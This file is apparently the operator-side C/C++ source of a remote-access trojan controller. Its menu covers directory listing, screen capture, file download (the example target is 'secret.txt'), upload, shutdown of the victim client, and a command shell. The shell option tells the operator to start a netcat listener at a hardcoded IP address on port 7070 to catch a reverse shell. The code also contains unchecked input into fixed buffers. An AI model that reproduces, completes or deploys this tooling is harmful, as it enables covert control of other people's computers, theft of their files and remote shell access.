#include <string>
using namespace std;
#define BUFFER_SIZE 1024
#define FILE_NAME_MAX_SIZE 512
typedef struct command
{
    int seq;
	int end;
	int length;
	int file_block_length;
    char bank[1024];
} command;
struct client_info
{
    SOCKET client;
    struct sockaddr_in client_address;
};
void ShowMenu(void)
{
    printf("=========================================\n");
    printf("         Please make a choice:  ||        \n");
    printf("         1:  ||close            ||       \n");
    printf("         2:  ||tree file dir    ||       \n");
    printf("         3:  ||shutdown client  ||       \n");
    printf("         4:  ||screen   dump    ||       \n");
    printf("         5:  ||download file    ||       \n");
    printf("         6:  ||upload   file    ||       \n");
    printf("         7:  ||cmd shell        ||       \n");
	printf("         8:  ||exit             ||       \n");
    printf("=========================================\n");
}

BOOL InitWinsock()
{
    int Error;
    WORD VersionRequested;
    WSADATA WsaData;
    VersionRequested = MAKEWORD(2, 2);
    Error = WSAStartup(VersionRequested, &WsaData); //initial WinSock2
    if (Error != 0)
    {
        return FALSE;
    }
    else
    {
        if (LOBYTE(WsaData.wVersion) != 2 || HIBYTE(WsaData.wHighVersion) != 2)
        {
            WSACleanup();
            return FALSE;
        }
    }
    return TRUE;
}
BOOL FileDirList(SOCKET Socket_, int seq)
{

    command mycommand;
    char buffer[BUFFER_SIZE];

    ZeroMemory(&mycommand, sizeof(mycommand));
    ZeroMemory(buffer, sizeof(buffer));

    //send dir path that server want to check
    mycommand.seq = seq;
    fflush(stdin);
    scanf("%s", buffer);
    fflush(stdin);
    strncpy(mycommand.bank, buffer,strlen(buffer));
    send(Socket_, (char *)&mycommand, sizeof(mycommand), 0);

    int length = 0;
    printf("Tree Tree Tree Tree\n");
    //loop to receive data
    while (length = recv(Socket_, (char *)&mycommand, sizeof(mycommand), 0))
    {
        if (length <= 0)
        {
            printf("Recieve Data From Server error\n");
            break;
        }
        printf("%s\n", mycommand.bank);
        ZeroMemory(mycommand.bank, BUFFER_SIZE);
		if(mycommand.end==1)
		{
			 printf("dir listed Finished!\n");
			 break;
		}
    }
   
    return 0;
}
int file_size(const char *filename)
{
    int size = 0;
    FILE *fp = fopen(filename, "r");
    if (!fp)
    {
        return -1;
    }
    fseek(fp, 0L, SEEK_END);
    size = ftell(fp);
    fclose(fp);
    return size;
}

BOOL FileReceive(SOCKET Socket_, const char *name, int seq)
{
    command mycommand;
    ZeroMemory(&mycommand, sizeof(command));
    FILE *fp = fopen(name, "wb+");
    if (fp == NULL)
    {
        printf("File:\t%s Can Not Open To Write!\n", name);
        exit(1);
    }

    int length = 0;
	int write_length = 0;
    printf("ABCDE\n");
    while (length = recv(Socket_, (char *)&mycommand, sizeof(command), 0))
    {
        if (mycommand.seq != seq)
        {
            printf("seq wrong file write quit\n");
            printf("server seq %d, client seq %d\n", seq, mycommand.seq);
            if (remove(name) == 0)
            {
                printf("delete Tempfile ok,you can try again\n\n");
            }
            break;
        }
        printf("file_block_length = %d\n", mycommand.file_block_length);
        //printf("ABCDE12344\n");
        if (length <= 0)
        {
            printf("Recieve Data From Server error\n");
            if (remove(name) == 0)
            {
                printf("delete Tempfile ok,you can try again\n\n");
            }
            break;
        }

        write_length = write_length+ fwrite(mycommand.bank, sizeof(char), mycommand.file_block_length, fp);
        printf("write_lenth = %d mycommand.length =%d\n", write_length,mycommand.length);
        ZeroMemory(mycommand.bank, BUFFER_SIZE);
		if(write_length == mycommand.length && mycommand.end==1)
		{
			fclose(fp);
			break;
		}
    }
	
    if (file_size(name) == 0)
    {
        printf("get_file_size(file_name)=%ld\n", file_size(name));
        printf("filesize=0 OR no such file,File:\t%s Write Failed!\n", name);
        if (remove(name) == 0)
        {
            printf("delete Tempfile ok,you can try again\n\n");
        }
    }
    else
    {
        printf("Recieve File:\t %s  Finished!\n", name);
    }
    return 0;
}

unsigned __stdcall FunProc(LPVOID lpParam)
{
    struct client_info *client_ = (struct client_info *)lpParam;

    //receive hello from client
    command recvbuf;
    int global = 0;
    ZeroMemory(&recvbuf, sizeof(recvbuf));
    int ret = recv(client_->client, (char *)&recvbuf, sizeof(recvbuf), 0);
    int num = recvbuf.seq;
    switch (num)
    {
    case 0:
        printf("%s\n", recvbuf.bank);
        break;
        //case 4:

    default:
        printf("unknown seq from client\n");
        break;
    }

    //send seq and data to client;
    command mycommand;
    ZeroMemory(&mycommand, sizeof(mycommand));
    string name_temp;
    string s1;
	char name[FILE_NAME_MAX_SIZE + 1];
	int pos1;
	int a;
    while (true)
    {
        ShowMenu();
		ZeroMemory(&mycommand, sizeof(mycommand));
        fflush(stdin);
		printf("Please iuput your task number:");
        scanf("%d", &mycommand.seq);
        fflush(stdin);
		printf("%d\n",mycommand.seq);
        switch (mycommand.seq)
        {
        case 1:
            printf("excute %d\n", mycommand.seq);
            printf("close connect\n");
            global =1;
            send(client_->client, (char *)&mycommand, sizeof(mycommand), 0);
            closesocket(client_->client);
            break;
        case 2:
            printf("excute %d\n", mycommand.seq);
            printf( "Enter a directory (example : c:\\user\\louis\\,ends with \'\\\'): \n");
            FileDirList(client_->client,mycommand.seq);
            break;
        case 3:
            printf("excute %d\n", mycommand.seq);
            printf("you will shutdown client!!!\n");
            printf("input 1 to start,0 to stop\n");
            fflush(stdin);
            scanf("%d",&a);
            do{
                if(a==1)
                {
                    printf("shutdown client\n");
                    global=1;
                    break;
                }
                if(a==0)
                {
                    printf("stop successfully...\n");
                }
                printf("input again\n");
                fflush(stdin);
                scanf("%d",&a);
            }while (1);
            send(client_->client, (char *)&mycommand, sizeof(mycommand), 0);
            closesocket(client_->client);
            break;
        case 4:
            ZeroMemory(name, sizeof(name));
            printf("excute %d\n", mycommand.seq);
            printf("name your bmp(xx.bmp) :");
            fflush(stdin);
            scanf("%s", name);
            fflush(stdin);
            strncpy(mycommand.bank,name , strlen(name));
			printf("Please wait about ten seconds to receive your bmp....\n");
            send(client_->client, (char *)&mycommand, sizeof(mycommand), 0);
            FileReceive(client_->client, name, mycommand.seq);
            break;
        case 5:
            ZeroMemory(name, sizeof(name));
            printf("excute %d\n", mycommand.seq);
            printf("example : C:\\User\\louis\\secret.txt ");
            printf("OR secret.txt\n");
            printf("download file path and name: ");
            fflush(stdin);
            scanf("%s", name);
            fflush(stdin);
            strncpy(mycommand.bank,name , strlen(name));
            name_temp = mycommand.bank;
            pos1 = name_temp.find_last_of('\\');
            s1 = name_temp.substr(pos1 + 1);
            send(client_->client, (char *)&mycommand, sizeof(mycommand), 0);
            FileReceive(client_->client, s1.c_str(), mycommand.seq);
            break;
        case 6:
            printf("excute %d\n", mycommand.seq);
            send(client_->client, (char *)&mycommand, sizeof(mycommand), 0);
            break;
        case 7:
            printf("excute %d\n", mycommand.seq);
            printf("Please open nc at 139.9.113.225 listen 7070\n");
            printf("input 1 to start\n");
            
            fflush(stdin);
            scanf("%d",&a);
            do{
                if(a==1)
                {
                    printf("Start connect! Please Wait\n");
                    break;
                }
                printf("input 1 to start\n");
                fflush(stdin);
                scanf("%d",&a);
            }while (1);
            send(client_->client, (char *)&mycommand, sizeof(mycommand), 0);
            break;
		case 8:
			global=1;

        default:
            printf("It is wrong number\n");
			exit(-1);
            break;
        }
        if(global ==1)
        {
            printf("closesocket from client wait again...\n");
            break;
        }
    }
    return 0;
}

